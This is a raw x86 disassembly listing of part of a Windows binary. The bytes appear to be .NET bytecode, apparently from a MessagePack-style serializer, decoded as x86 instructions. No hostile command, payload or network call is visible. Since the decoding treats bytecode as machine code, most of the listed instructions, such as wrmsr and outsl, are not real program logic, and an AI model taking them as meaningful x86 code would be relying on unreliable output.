  40311b:	02 7d 25             	add    0x25(%ebp),%bh
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 02                	add    $0x2,%al
  403122:	7b 26                	jnp    0x40314a
  403124:	00 00                	add    %al,(%eax)
  403126:	04 06                	add    $0x6,%al
  403128:	6f                   	outsl  %ds:(%esi),(%dx)
  403129:	5d                   	pop    %ebp
  40312a:	00 00                	add    %al,(%eax)
  40312c:	0a 06                	or     (%esi),%al
  40312e:	2a 00                	sub    (%eax),%al
  403130:	1b 30                	sbb    (%eax),%esi
  403132:	02 00                	add    (%eax),%al
  403134:	54                   	push   %esp
  403135:	00 00                	add    %al,(%eax)
  403137:	00 09                	add    %cl,(%ecx)
  403139:	00 00                	add    %al,(%eax)
  40313b:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  403141:	6f                   	outsl  %ds:(%esi),(%dx)
  403142:	5b                   	pop    %ebx
  403143:	00 00                	add    %al,(%eax)
  403145:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403148:	7b 26                	jnp    0x403170
  40314a:	00 00                	add    %al,(%eax)
  40314c:	04 6f                	add    $0x6f,%al
  40314e:	5e                   	pop    %esi
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 0d 2b 20 12 03    	or     0x312202b,%cl
  403157:	28 5f 00             	sub    %bl,0x0(%edi)
  40315a:	00 0a                	add    %cl,(%edx)
  40315c:	13 04 06             	adc    (%esi,%eax,1),%eax
  40315f:	17                   	pop    %ss
  403160:	58                   	pop    %eax
  403161:	0a 08                	or     (%eax),%cl
  403163:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  403166:	22 00                	and    (%eax),%al
  403168:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40316b:	60                   	pusha
  40316c:	00 00                	add    %al,(%eax)
  40316e:	0a 2c 04             	or     (%esp,%eax,1),%ch
  403171:	06                   	push   %es
  403172:	0b de                	or     %esi,%ebx
  403174:	19 12                	sbb    %edx,(%edx)
  403176:	03 28                	add    (%eax),%ebp
  403178:	61                   	popa
  403179:	00 00                	add    %al,(%eax)
  40317b:	0a 2d d7 de 0e 12    	or     0x120eded7,%ch
  403181:	03 fe                	add    %esi,%edi
  403183:	16                   	push   %ss
  403184:	02 00                	add    (%eax),%al
  403186:	00 1b                	add    %bl,(%ebx)
  403188:	6f                   	outsl  %ds:(%esi),(%dx)
  403189:	33 00                	xor    (%eax),%eax
  40318b:	00 0a                	add    %cl,(%edx)
  40318d:	dc 07                	faddl  (%edi)
  40318f:	2a 01                	sub    (%ecx),%al
  403191:	10 00                	adc    %al,(%eax)
  403193:	00 02                	add    %al,(%edx)
  403195:	00 17                	add    %dl,(%edi)
  403197:	00 2d 44 00 0e 00    	add    %ch,0xe0044
  40319d:	00 00                	add    %al,(%eax)
  40319f:	00 13                	add    %dl,(%ebx)
  4031a1:	30 02                	xor    %al,(%edx)
  4031a3:	00 1b                	add    %bl,(%ebx)
  4031a5:	00 00                	add    %al,(%eax)
  4031a7:	00 01                	add    %al,(%ecx)
  4031a9:	00 00                	add    %al,(%eax)
  4031ab:	11 02                	adc    %eax,(%edx)
  4031ad:	03 28                	add    (%eax),%ebp
  4031af:	3b 00                	cmp    (%eax),%eax
  4031b1:	00 06                	add    %al,(%esi)
  4031b3:	0a 06                	or     (%esi),%al
  4031b5:	15 33 02 14 2a       	adc    $0x2a140233,%eax
  4031ba:	02 7b 26             	add    0x26(%ebx),%bh
  4031bd:	00 00                	add    %al,(%eax)
  4031bf:	04 06                	add    $0x6,%al
  4031c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4031c2:	59                   	pop    %ecx
  4031c3:	00 00                	add    %al,(%eax)
  4031c5:	0a 2a                	or     (%edx),%ch
  4031c7:	00 13                	add    %dl,(%ebx)
  4031c9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4031cc:	ad                   	lods   %ds:(%esi),%eax
  4031cd:	00 00                	add    %al,(%eax)
  4031cf:	00 0a                	add    %cl,(%edx)
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	11 02                	adc    %eax,(%edx)
  4031d5:	7b 26                	jnp    0x4031fd
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	04 6f                	add    $0x6f,%al
  4031db:	5a                   	pop    %edx
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4031e1:	1f                   	pop    %ds
  4031e2:	0f 30                	wrmsr
  4031e4:	13 20                	adc    (%eax),%esp
  4031e6:	80 00 00             	addb   $0x0,(%eax)
  4031e9:	00 08                	add    %cl,(%eax)
  4031eb:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  4031ee:	0a 03                	or     (%ebx),%al
  4031f0:	06                   	push   %es
  4031f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4031f2:	62 00                	bound  %eax,(%eax)
  4031f4:	00 0a                	add    %cl,(%edx)
  4031f6:	2b 53 08             	sub    0x8(%ebx),%edx
  4031f9:	20 ff                	and    %bh,%bh
  4031fb:	ff 00                	incl   (%eax)
  4031fd:	00 30                	add    %dh,(%eax)
  4031ff:	27                   	daa
  403200:	20 de                	and    %bl,%dh
  403202:	00 00                	add    %al,(%eax)
  403204:	00 0a                	add    %cl,(%edx)
  403206:	03 06                	add    (%esi),%eax
  403208:	6f                   	outsl  %ds:(%esi),(%dx)
  403209:	62 00                	bound  %eax,(%eax)
  40320b:	00 0a                	add    %cl,(%edx)
  40320d:	08 68 28             	or     %ch,0x28(%eax)
  403210:	63 00                	arpl   %eax,(%eax)
  403212:	00 0a                	add    %cl,(%edx)
  403214:	28 26                	sub    %ah,(%esi)
  403216:	00 00                	add    %al,(%eax)
  403218:	06                   	push   %es
  403219:	0b 03                	or     (%ebx),%eax
  40321b:	07                   	pop    %es
  40321c:	16                   	push   %ss
  40321d:	07                   	pop    %es
  40321e:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403221:	4c                   	dec    %esp
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 2b                	or     (%ebx),%ch
  403226:	24 20                	and    $0x20,%al
  403228:	df 00                	filds  (%eax)
  40322a:	00 00                	add    %al,(%eax)
  40322c:	0a 03                	or     (%ebx),%al
  40322e:	06                   	push   %es
  40322f:	6f                   	outsl  %ds:(%esi),(%dx)
  403230:	62 00                	bound  %eax,(%eax)
  403232:	00 0a                	add    %cl,(%edx)
  403234:	08 28                	or     %ch,(%eax)
  403236:	4a                   	dec    %edx
  403237:	00 00                	add    %al,(%eax)
  403239:	0a 28                	or     (%eax),%ch
  40323b:	26 00 00             	add    %al,%es:(%eax)
  40323e:	06                   	push   %es
  40323f:	0b 03                	or     (%ebx),%eax
  403241:	07                   	pop    %es
  403242:	16                   	push   %ss
  403243:	07                   	pop    %es
  403244:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403247:	4c                   	dec    %esp
  403248:	00 00                	add    %al,(%eax)
  40324a:	0a 16                	or     (%esi),%dl
  40324c:	0d 2b 2d 03 02       	or     $0x2032d2b,%eax
  403251:	7b 26                	jnp    0x403279
  403253:	00 00                	add    %al,(%eax)
  403255:	04 09                	add    $0x9,%al
  403257:	6f                   	outsl  %ds:(%esi),(%dx)
  403258:	59                   	pop    %ecx
  403259:	00 00                	add    %al,(%eax)
  40325b:	0a 7b 21             	or     0x21(%ebx),%bh
  40325e:	00 00                	add    %al,(%eax)
  403260:	04 28                	add    $0x28,%al
  403262:	68 00 00 06 02       	push   $0x2060000
  403267:	7b 26                	jnp    0x40328f
  403269:	00 00                	add    %al,(%eax)
  40326b:	04 09                	add    $0x9,%al
  40326d:	6f                   	outsl  %ds:(%esi),(%dx)
  40326e:	59                   	pop    %ecx
  40326f:	00 00                	add    %al,(%eax)
  403271:	0a 03                	or     (%ebx),%al
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	06                   	push   %es
  403278:	09 17                	or     %edx,(%edi)
  40327a:	58                   	pop    %eax
  40327b:	0d 09 08 32 cf       	or     $0xcf320809,%eax
  403280:	2a 00                	sub    (%eax),%al
  403282:	00 00                	add    %al,(%eax)
  403284:	13 30                	adc    (%eax),%esi
  403286:	04 00                	add    $0x0,%al
  403288:	96                   	xchg   %eax,%esi
  403289:	00 00                	add    %al,(%eax)
  40328b:	00 0a                	add    %cl,(%edx)
  40328d:	00 00                	add    %al,(%eax)
  40328f:	11 02                	adc    %eax,(%edx)
  403291:	7b 26                	jnp    0x4032b9
  403293:	00 00                	add    %al,(%eax)
  403295:	04 6f                	add    $0x6f,%al
  403297:	5a                   	pop    %edx
  403298:	00 00                	add    %al,(%eax)
  40329a:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40329d:	1f                   	pop    %ds
  40329e:	0f 30                	wrmsr
  4032a0:	13 20                	adc    (%eax),%esp
  4032a2:	90                   	nop
  4032a3:	00 00                	add    %al,(%eax)
  4032a5:	00 08                	add    %cl,(%eax)
  4032a7:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  4032aa:	0a 03                	or     (%ebx),%al
  4032ac:	06                   	push   %es
  4032ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ae:	62 00                	bound  %eax,(%eax)
  4032b0:	00 0a                	add    %cl,(%edx)
  4032b2:	2b 53 08             	sub    0x8(%ebx),%edx
  4032b5:	20 ff                	and    %bh,%bh
  4032b7:	ff 00                	incl   (%eax)
  4032b9:	00 30                	add    %dh,(%eax)
  4032bb:	27                   	daa
  4032bc:	20 dc                	and    %bl,%ah
  4032be:	00 00                	add    %al,(%eax)
  4032c0:	00 0a                	add    %cl,(%edx)
  4032c2:	03 06                	add    (%esi),%eax
  4032c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c5:	62 00                	bound  %eax,(%eax)
  4032c7:	00 0a                	add    %cl,(%edx)
  4032c9:	08 68 28             	or     %ch,0x28(%eax)
  4032cc:	63 00                	arpl   %eax,(%eax)
  4032ce:	00 0a                	add    %cl,(%edx)
  4032d0:	28 26                	sub    %ah,(%esi)
  4032d2:	00 00                	add    %al,(%eax)
  4032d4:	06                   	push   %es
  4032d5:	0b 03                	or     (%ebx),%eax
  4032d7:	07                   	pop    %es
  4032d8:	16                   	push   %ss
  4032d9:	07                   	pop    %es
  4032da:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032dd:	4c                   	dec    %esp
  4032de:	00 00                	add    %al,(%eax)
  4032e0:	0a 2b                	or     (%ebx),%ch
  4032e2:	24 20                	and    $0x20,%al
  4032e4:	dd 00                	fldl   (%eax)
  4032e6:	00 00                	add    %al,(%eax)
  4032e8:	0a 03                	or     (%ebx),%al
  4032ea:	06                   	push   %es
  4032eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ec:	62 00                	bound  %eax,(%eax)
  4032ee:	00 0a                	add    %cl,(%edx)
  4032f0:	08 28                	or     %ch,(%eax)
  4032f2:	4a                   	dec    %edx
  4032f3:	00 00                	add    %al,(%eax)
  4032f5:	0a 28                	or     (%eax),%ch
  4032f7:	26 00 00             	add    %al,%es:(%eax)
  4032fa:	06                   	push   %es
  4032fb:	0b 03                	or     (%ebx),%eax
  4032fd:	07                   	pop    %es
  4032fe:	16                   	push   %ss
  4032ff:	07                   	pop    %es
  403300:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403303:	4c                   	dec    %esp
  403304:	00 00                	add    %al,(%eax)
  403306:	0a 16                	or     (%esi),%dl
  403308:	0d 2b 16 02 7b       	or     $0x7b02162b,%eax
  40330d:	26 00 00             	add    %al,%es:(%eax)
  403310:	04 09                	add    $0x9,%al
  403312:	6f                   	outsl  %ds:(%esi),(%dx)
  403313:	59                   	pop    %ecx
  403314:	00 00                	add    %al,(%eax)
  403316:	0a 03                	or     (%ebx),%al
  403318:	6f                   	outsl  %ds:(%esi),(%dx)
  403319:	58                   	pop    %eax
  40331a:	00 00                	add    %al,(%eax)
  40331c:	06                   	push   %es
  40331d:	09 17                	or     %edx,(%edi)
  40331f:	58                   	pop    %eax
  403320:	0d 09 08 32 e6       	or     $0xe6320809,%eax
  403325:	2a 00                	sub    (%eax),%al
  403327:	00 13                	add    %dl,(%ebx)
  403329:	30 02                	xor    %al,(%edx)
  40332b:	00 96 00 00 00 0b    	add    %dl,0xb000000(%esi)
  403331:	00 00                	add    %al,(%eax)
  403333:	11 02                	adc    %eax,(%edx)
  403335:	7b 24                	jnp    0x40335b
  403337:	00 00                	add    %al,(%eax)
  403339:	04 0a                	add    $0xa,%al
  40333b:	06                   	push   %es
  40333c:	1a 59 45             	sbb    0x45(%ecx),%bl
  40333f:	07                   	pop    %es
  403340:	00 00                	add    %al,(%eax)
  403342:	00 1f                	add    %bl,(%edi)
  403344:	00 00                	add    %al,(%eax)
  403346:	00 02                	add    %al,(%edx)
  403348:	00 00                	add    %al,(%eax)
  40334a:	00 13                	add    %dl,(%ebx)
  40334c:	00 00                	add    %al,(%eax)
  40334e:	00 68 00             	add    %ch,0x0(%eax)
  403351:	00 00                	add    %al,(%eax)
  403353:	35 00 00 00 46       	xor    $0x46000000,%eax
  403358:	00 00                	add    %al,(%eax)
  40335a:	00 57 00             	add    %dl,0x0(%edi)
  40335d:	00 00                	add    %al,(%eax)
  40335f:	2b 66 02             	sub    0x2(%esi),%esp
  403362:	7b 23                	jnp    0x403387
  403364:	00 00                	add    %al,(%eax)
  403366:	04 a5                	add    $0xa5,%al
  403368:	51                   	push   %ecx
  403369:	00 00                	add    %al,(%eax)
  40336b:	01 28                	add    %ebp,(%eax)
  40336d:	64 00 00             	add    %al,%fs:(%eax)
  403370:	0a 2a                	or     (%edx),%ch
  403372:	02 7b 23             	add    0x23(%ebx),%bh
  403375:	00 00                	add    %al,(%eax)
  403377:	04 a5                	add    $0xa5,%al
  403379:	52                   	push   %edx
  40337a:	00 00                	add    %al,(%eax)
  40337c:	01 2a                	add    %ebp,(%edx)
  40337e:	02 7b 23             	add    0x23(%ebx),%bh
  403381:	00 00                	add    %al,(%eax)
  403383:	04 6f                	add    $0x6f,%al
  403385:	38 00                	cmp    %al,(%eax)
  403387:	00 0a                	add    %cl,(%edx)
  403389:	6f                   	outsl  %ds:(%esi),(%dx)
  40338a:	65 00 00             	add    %al,%gs:(%eax)
  40338d:	0a 28                	or     (%eax),%ch
  40338f:	66 00 00             	data16 add %al,(%eax)
  403392:	0a 2a                	or     (%edx),%ch
  403394:	02 7b 23             	add    0x23(%ebx),%bh
  403397:	00 00                	add    %al,(%eax)
  403399:	04 a5                	add    $0xa5,%al
  40339b:	53                   	push   %ebx
  40339c:	00 00                	add    %al,(%eax)
  40339e:	01 28                	add    %ebp,(%eax)
  4033a0:	67 00 00             	add    %al,(%bx,%si)
  4033a3:	0a 2a                	or     (%edx),%ch
  4033a5:	02 7b 23             	add    0x23(%ebx),%bh
  4033a8:	00 00                	add    %al,(%eax)
  4033aa:	04 a5                	add    $0xa5,%al
  4033ac:	54                   	push   %esp
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 28                	add    %ebp,(%eax)
  4033b1:	68 00 00 0a 2a       	push   $0x2a0a0000
  4033b6:	02 7b 23             	add    0x23(%ebx),%bh
  4033b9:	00 00                	add    %al,(%eax)
  4033bb:	04 a5                	add    $0xa5,%al
  4033bd:	55                   	push   %ebp
  4033be:	00 00                	add    %al,(%eax)
  4033c0:	01 28                	add    %ebp,(%eax)
  4033c2:	69 00 00 0a 2a 16    	imul   $0x162a0a00,(%eax),%eax
  4033c8:	6a 2a                	push   $0x2a
  4033ca:	00 00                	add    %al,(%eax)
  4033cc:	13 30                	adc    (%eax),%esi
  4033ce:	02 00                	add    (%eax),%al
  4033d0:	96                   	xchg   %eax,%esi
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 0b                	add    %cl,(%ebx)
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	11 02                	adc    %eax,(%edx)
  4033d9:	7b 24                	jnp    0x4033ff
  4033db:	00 00                	add    %al,(%eax)
  4033dd:	04 0a                	add    $0xa,%al
  4033df:	06                   	push   %es
  4033e0:	1a 59 45             	sbb    0x45(%ecx),%bl
  4033e3:	07                   	pop    %es
  4033e4:	00 00                	add    %al,(%eax)
  4033e6:	00 1f                	add    %bl,(%edi)
  4033e8:	00 00                	add    %al,(%eax)
  4033ea:	00 02                	add    %al,(%edx)
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	00 0e                	add    %cl,(%esi)
  4033f0:	00 00                	add    %al,(%eax)
  4033f2:	00 68 00             	add    %ch,0x0(%eax)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	35 00 00 00 46       	xor    $0x46000000,%eax
  4033fc:	00 00                	add    %al,(%eax)
  4033fe:	00 57 00             	add    %dl,0x0(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	2b 66 02             	sub    0x2(%esi),%esp
  403406:	7b 23                	jnp    0x40342b
  403408:	00 00                	add    %al,(%eax)
  40340a:	04 a5                	add    $0xa5,%al
  40340c:	51                   	push   %ecx
  40340d:	00 00                	add    %al,(%eax)
  40340f:	01 2a                	add    %ebp,(%edx)
  403411:	02 7b 23             	add    0x23(%ebx),%bh
  403414:	00 00                	add    %al,(%eax)
  403416:	04 a5                	add    $0xa5,%al
  403418:	51                   	push   %ecx
  403419:	00 00                	add    %al,(%eax)
  40341b:	01 28                	add    %ebp,(%eax)
  40341d:	6a 00                	push   $0x0
  40341f:	00 0a                	add    %cl,(%edx)
  403421:	2a 02                	sub    (%edx),%al
  403423:	7b 23                	jnp    0x403448
  403425:	00 00                	add    %al,(%eax)
  403427:	04 6f                	add    $0x6f,%al
  403429:	38 00                	cmp    %al,(%eax)
  40342b:	00 0a                	add    %cl,(%edx)
  40342d:	6f                   	outsl  %ds:(%esi),(%dx)
  40342e:	65 00 00             	add    %al,%gs:(%eax)
  403431:	0a 28                	or     (%eax),%ch
  403433:	6b 00 00             	imul   $0x0,(%eax),%eax
  403436:	0a 2a                	or     (%edx),%ch
  403438:	02 7b 23             	add    0x23(%ebx),%bh
  40343b:	00 00                	add    %al,(%eax)
  40343d:	04 a5                	add    $0xa5,%al
  40343f:	53                   	push   %ebx
  403440:	00 00                	add    %al,(%eax)
  403442:	01 28                	add    %ebp,(%eax)
  403444:	6c                   	insb   (%dx),%es:(%edi)
  403445:	00 00                	add    %al,(%eax)
  403447:	0a 2a                	or     (%edx),%ch
  403449:	02 7b 23             	add    0x23(%ebx),%bh
  40344c:	00 00                	add    %al,(%eax)
  40344e:	04 a5                	add    $0xa5,%al
  403450:	54                   	push   %esp
  403451:	00 00                	add    %al,(%eax)
  403453:	01 28                	add    %ebp,(%eax)
  403455:	6d                   	insl   (%dx),%es:(%edi)
  403456:	00 00                	add    %al,(%eax)
  403458:	0a 2a                	or     (%edx),%ch
  40345a:	02 7b 23             	add    0x23(%ebx),%bh
  40345d:	00 00                	add    %al,(%eax)
  40345f:	04 a5                	add    $0xa5,%al
  403461:	55                   	push   %ebp
  403462:	00 00                	add    %al,(%eax)
  403464:	01 28                	add    %ebp,(%eax)
  403466:	6e                   	outsb  %ds:(%esi),(%dx)
  403467:	00 00                	add    %al,(%eax)
  403469:	0a 2a                	or     (%edx),%ch
  40346b:	16                   	push   %ss
  40346c:	6a 2a                	push   $0x2a
  40346e:	00 00                	add    %al,(%eax)
  403470:	13 30                	adc    (%eax),%esi
  403472:	02 00                	add    (%eax),%al
  403474:	84 00                	test   %al,(%eax)
  403476:	00 00                	add    %al,(%eax)
  403478:	0b 00                	or     (%eax),%eax
  40347a:	00 11                	add    %dl,(%ecx)
  40347c:	02 7b 24             	add    0x24(%ebx),%bh
  40347f:	00 00                	add    %al,(%eax)
  403481:	04 0a                	add    $0xa,%al
  403483:	06                   	push   %es
  403484:	1a 59 45             	sbb    0x45(%ecx),%bl
  403487:	07                   	pop    %es
  403488:	00 00                	add    %al,(%eax)
  40348a:	00 13                	add    %dl,(%ebx)
  40348c:	00 00                	add    %al,(%eax)
  40348e:	00 02                	add    %al,(%edx)
  403490:	00 00                	add    %al,(%eax)
  403492:	00 4f 00             	add    %cl,0x0(%edi)
  403495:	00 00                	add    %al,(%eax)
  403497:	4f                   	dec    %edi
  403498:	00 00                	add    %al,(%eax)
  40349a:	00 24 00             	add    %ah,(%eax,%eax,1)
  40349d:	00 00                	add    %al,(%eax)
  40349f:	30 00                	xor    %al,(%eax)
  4034a1:	00 00                	add    %al,(%eax)
  4034a3:	3d 00 00 00 2b       	cmp    $0x2b000000,%eax
  4034a8:	4d                   	dec    %ebp
  4034a9:	02 7b 23             	add    0x23(%ebx),%bh
  4034ac:	00 00                	add    %al,(%eax)
  4034ae:	04 a5                	add    $0xa5,%al
  4034b0:	51                   	push   %ecx
  4034b1:	00 00                	add    %al,(%eax)
  4034b3:	01 28                	add    %ebp,(%eax)
  4034b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b6:	00 00                	add    %al,(%eax)
  4034b8:	0a 2a                	or     (%edx),%ch
  4034ba:	02 7b 23             	add    0x23(%ebx),%bh
  4034bd:	00 00                	add    %al,(%eax)
  4034bf:	04 74                	add    $0x74,%al
  4034c1:	39 00                	cmp    %eax,(%eax)
  4034c3:	00 01                	add    %al,(%ecx)
  4034c5:	28 70 00             	sub    %dh,0x0(%eax)
  4034c8:	00 0a                	add    %cl,(%edx)
  4034ca:	2a 02                	sub    (%edx),%al
  4034cc:	7b 23                	jnp    0x4034f1
  4034ce:	00 00                	add    %al,(%eax)
  4034d0:	04 a5                	add    $0xa5,%al
  4034d2:	53                   	push   %ebx
  4034d3:	00 00                	add    %al,(%eax)
  4034d5:	01 2a                	add    %ebp,(%edx)
  4034d7:	02 7b 23             	add    0x23(%ebx),%bh
  4034da:	00 00                	add    %al,(%eax)
  4034dc:	04 a5                	add    $0xa5,%al
  4034de:	54                   	push   %esp
  4034df:	00 00                	add    %al,(%eax)
  4034e1:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  4034e5:	7b 23                	jnp    0x40350a
  4034e7:	00 00                	add    %al,(%eax)
  4034e9:	04 a5                	add    $0xa5,%al
  4034eb:	55                   	push   %ebp
  4034ec:	00 00                	add    %al,(%eax)
  4034ee:	01 28                	add    %ebp,(%eax)
  4034f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  4034ff:	2a 13                	sub    (%ebx),%dl
  403501:	30 02                	xor    %al,(%edx)
  403503:	00 a1 00 00 00 0c    	add    %ah,0xc000000(%ecx)
  403509:	00 00                	add    %al,(%eax)
  40350b:	11 02                	adc    %eax,(%edx)
  40350d:	7b 24                	jnp    0x403533
  40350f:	00 00                	add    %al,(%eax)
  403511:	04 0a                	add    $0xa,%al
  403513:	06                   	push   %es
  403514:	1a 59 45             	sbb    0x45(%ecx),%bl
  403517:	08 00                	or     %al,(%eax)
  403519:	00 00                	add    %al,(%eax)
  40351b:	13 00                	adc    (%eax),%eax
  40351d:	00 00                	add    %al,(%eax)
  40351f:	02 00                	add    (%eax),%al
  403521:	00 00                	add    %al,(%eax)
  403523:	6b 00 00             	imul   $0x0,(%eax),%eax
  403526:	00 6b 00             	add    %ch,0x0(%ebx)
  403529:	00 00                	add    %al,(%eax)
  40352b:	24 00                	and    $0x0,%al
  40352d:	00 00                	add    %al,(%eax)
  40352f:	35 00 00 00 46       	xor    $0x46000000,%eax
  403534:	00 00                	add    %al,(%eax)
  403536:	00 5f 00             	add    %bl,0x0(%edi)
  403539:	00 00                	add    %al,(%eax)
  40353b:	2b 69 02             	sub    0x2(%ecx),%ebp
  40353e:	7b 23                	jnp    0x403563
  403540:	00 00                	add    %al,(%eax)
  403542:	04 a5                	add    $0xa5,%al
  403544:	51                   	push   %ecx
  403545:	00 00                	add    %al,(%eax)
  403547:	01 28                	add    %ebp,(%eax)
  403549:	56                   	push   %esi
  40354a:	00 00                	add    %al,(%eax)
  40354c:	0a 2a                	or     (%edx),%ch
  40354e:	02 7b 23             	add    0x23(%ebx),%bh
  403551:	00 00                	add    %al,(%eax)
  403553:	04 6f                	add    $0x6f,%al
  403555:	38 00                	cmp    %al,(%eax)
  403557:	00 0a                	add    %cl,(%edx)
  403559:	28 22                	sub    %ah,(%edx)
  40355b:	00 00                	add    %al,(%eax)
  40355d:	06                   	push   %es
  40355e:	2a 02                	sub    (%edx),%al
  403560:	7b 23                	jnp    0x403585
  403562:	00 00                	add    %al,(%eax)
  403564:	04 a5                	add    $0xa5,%al
  403566:	53                   	push   %ebx
  403567:	00 00                	add    %al,(%eax)
  403569:	01 28                	add    %ebp,(%eax)
  40356b:	57                   	push   %edi
  40356c:	00 00                	add    %al,(%eax)
  40356e:	0a 2a                	or     (%edx),%ch
  403570:	02 7b 23             	add    0x23(%ebx),%bh
  403573:	00 00                	add    %al,(%eax)
  403575:	04 a5                	add    $0xa5,%al
  403577:	54                   	push   %esp
  403578:	00 00                	add    %al,(%eax)
  40357a:	01 28                	add    %ebp,(%eax)
  40357c:	71 00                	jno    0x40357e
  40357e:	00 0a                	add    %cl,(%edx)
  403580:	2a 02                	sub    (%edx),%al
  403582:	7b 23                	jnp    0x4035a7
  403584:	00 00                	add    %al,(%eax)
  403586:	04 a5                	add    $0xa5,%al
  403588:	55                   	push   %ebp
  403589:	00 00                	add    %al,(%eax)
  40358b:	01 0b                	add    %ecx,(%ebx)
  40358d:	12 01                	adc    (%ecx),%al
  40358f:	28 72 00             	sub    %dh,0x0(%edx)
  403592:	00 0a                	add    %cl,(%edx)
  403594:	28 56 00             	sub    %dl,0x0(%esi)
  403597:	00 0a                	add    %cl,(%edx)
  403599:	2a 02                	sub    (%edx),%al
  40359b:	7b 23                	jnp    0x4035c0
  40359d:	00 00                	add    %al,(%eax)
  40359f:	04 74                	add    $0x74,%al
  4035a1:	03 00                	add    (%eax),%eax
  4035a3:	00 1b                	add    %bl,(%ebx)
  4035a5:	2a 16                	sub    (%esi),%dl
  4035a7:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4035ab:	01 2a                	add    %ebp,(%edx)
  4035ad:	00 00                	add    %al,(%eax)
  4035af:	00 13                	add    %dl,(%ebx)
  4035b1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4035b4:	48                   	dec    %eax
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 0d 00 00 11 03    	add    %cl,0x3110000
  4035bd:	28 73 00             	sub    %dh,0x0(%ebx)
  4035c0:	00 0a                	add    %cl,(%edx)
  4035c2:	2c 3e                	sub    $0x3e,%al
  4035c4:	14 0a                	adc    $0xa,%al
  4035c6:	03 19                	add    (%ecx),%ebx
  4035c8:	17                   	pop    %ss
  4035c9:	17                   	pop    %ss
  4035ca:	73 74                	jae    0x403640
  4035cc:	00 00                	add    %al,(%eax)
  4035ce:	0a 0b                	or     (%ebx),%cl
  4035d0:	07                   	pop    %es
  4035d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4035d2:	75 00                	jne    0x4035d4
  4035d4:	00 0a                	add    %cl,(%edx)
  4035d6:	d4 8d                	aam    $0x8d
  4035d8:	44                   	inc    %esp
  4035d9:	00 00                	add    %al,(%eax)
  4035db:	01 0a                	add    %ecx,(%edx)
  4035dd:	07                   	pop    %es
  4035de:	06                   	push   %es
  4035df:	16                   	push   %ss
  4035e0:	07                   	pop    %es
  4035e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4035e2:	75 00                	jne    0x4035e4
  4035e4:	00 0a                	add    %cl,(%edx)
  4035e6:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  4035ed:	07                   	pop    %es
  4035ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4035ef:	76 00                	jbe    0x4035f1
  4035f1:	00 0a                	add    %cl,(%edx)
  4035f3:	07                   	pop    %es
  4035f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f5:	41                   	inc    %ecx
  4035f6:	00 00                	add    %al,(%eax)
  4035f8:	0a 02                	or     (%edx),%al
  4035fa:	06                   	push   %es
  4035fb:	28 47 00             	sub    %al,0x0(%edi)
  4035fe:	00 06                	add    %al,(%esi)
  403600:	17                   	pop    %ss
  403601:	2a 16                	sub    (%esi),%dl
  403603:	2a 13                	sub    (%ebx),%dl
  403605:	30 04 00             	xor    %al,(%eax,%eax,1)
  403608:	97                   	xchg   %eax,%edi
  403609:	00 00                	add    %al,(%eax)
  40360b:	00 0e                	add    %cl,(%esi)
  40360d:	00 00                	add    %al,(%eax)
  40360f:	11 02                	adc    %eax,(%edx)
  403611:	0a 03                	or     (%ebx),%al
  403613:	6f                   	outsl  %ds:(%esi),(%dx)
  403614:	65 00 00             	add    %al,%gs:(%eax)
  403617:	0a 19                	or     (%ecx),%bl
  403619:	8d 3a                	lea    (%edx),%edi
  40361b:	00 00                	add    %al,(%eax)
  40361d:	01 25 d0 45 00 00    	add    %esp,0x45d0
  403623:	04 28                	add    $0x28,%al
  403625:	78 00                	js     0x403627
  403627:	00 0a                	add    %cl,(%edx)
  403629:	6f                   	outsl  %ds:(%esi),(%dx)
  40362a:	28 00                	sub    %al,(%eax)
  40362c:	00 0a                	add    %cl,(%edx)
  40362e:	0c 14                	or     $0x14,%al
  403630:	0d 08 8e 2d 02       	or     $0x22d8e08,%eax
  403635:	14 2a                	adc    $0x2a,%al
  403637:	08 8e 69 17 31 36    	or     %cl,0x36311769(%esi)
  40363d:	16                   	push   %ss
  40363e:	13 05 2b 28 08 11    	adc    0x1108282b,%eax
  403644:	05 9a 0d 06 09       	add    $0x9060d9a,%eax
  403649:	6f                   	outsl  %ds:(%esi),(%dx)
  40364a:	3c 00                	cmp    $0x0,%al
